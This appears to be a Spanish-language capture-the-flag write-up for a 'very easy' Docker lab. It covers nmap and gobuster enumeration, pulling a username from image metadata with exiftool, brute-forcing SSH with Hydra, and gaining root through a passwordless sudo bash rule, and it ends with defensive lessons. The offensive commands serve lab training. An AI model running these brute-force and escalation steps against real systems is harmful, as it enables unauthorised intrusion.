Aquí tienes el texto optimizado en Markdown. He corregido la numeración de secciones, mejorado la estructura de tablas, eliminado redundancias, estandarizado comandos y emojis para mayor claridad, y asegurado un flujo lógico sin repetir contenido.

🛡️ Writeup – borazuwarahctf (Dockers Labs)
Este documento detalla el proceso de resolución del desafío borazuwarahctf en Dockers Labs, desde el análisis inicial hasta el acceso root.

1️⃣ Información General
Campo	Información
Nombre	borazuwarahctf
Dificultad	Muy Fácil
IP objetivo	172.17.0.2
Plataforma	Dockers Labs
🎯 Objetivo
Obtener acceso al sistema mediante reconocimiento, enumeración y explotación, y escalar privilegios a root. Metodología: Reconocimiento → Enumeración → Identificación de ataque → Explotación → Escalada.

2️⃣ Reconocimiento
Usamos Nmap para identificar puertos y servicios.

bash
nmap -sC -sV -oN escaneoInicial.txt 172.17.0.2
Resultados clave:

Puerto	Servicio	Versión
22/tcp	SSH	OpenSSH 9.2p1 Debian
80/tcp	HTTP	Apache 2.4.59 (Debian)
Interpretación: SSH para acceso remoto y Apache en web. Priorizamos el servicio web (puerto 80).

3️⃣ Análisis del Servicio Web
Accediendo a http://172.17.0.2, solo aparece una imagen de un huevo Kinder Sorpresa, sin formularios, login ni scripts visibles.

Hipótesis: Posibles metadatos ocultos, esteganografía o archivos escondidos. Procedemos a enumeración.

4️⃣ Enumeración Web
Usamos Gobuster para directorios y archivos.

bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt
Resultados:

Ruta	Status
.htaccess	403
.htpasswd	403
index.html	200
server-status	403
No hay rutas explotables. Enfocamos la imagen de index.html.

5️⃣ Análisis de la Imagen
Descargamos imagen.jpeg y extraemos metadatos con ExifTool:

bash
exiftool imagen.jpeg
Resultados clave:

Description: ---------- User: borazuwarah ----------

Title: ---------- Password: ----------

Credenciales: borazuwarah / **** (contraseña oculta en metadatos).

6️⃣ Ataque al Servicio SSH
Fuerza bruta con Hydra usando la lista claves.txt:

bash
hydra -l borazuwarah -P claves.txt ssh://172.17.0.2 -I -f
Resultado: borazuwarah:123456

7️⃣ Acceso al Sistema
bash
ssh borazuwarah@172.17.0.2
bash
whoami
# borazuwarah
Acceso confirmado como borazuwarah.

8️⃣ Escalada de Privilegios
bash
sudo -l
# (ALL) NOPASSWD: /bin/bash
Explotación:

bash
sudo bash
whoami
# root
Acceso root obtenido.

9️⃣ Conclusión
🔴 Vulnerabilidades
Vulnerabilidad	Impacto
Credenciales en metadatos	Filtración sensible
Falta de revisión de archivos	Exposición de datos
Configuración insegura de sudo	Escalada directa a root
⛓️ Cadena de Ataque
Reconocimiento (Nmap) → Análisis web → Imagen → Metadatos → Credenciales → SSH → Sudo → ROOT.

📚 Lecciones
Revisa metadatos antes de publicar archivos.

No almacenes credenciales en públicos.

Aplica mínimo privilegio y configura sudo correctamente.

✍️ Autor: Raúl Bustamante
🎓 Ingeniería Informática
🔐 Intereses: Ciberseguridad, Pentesting, CTF
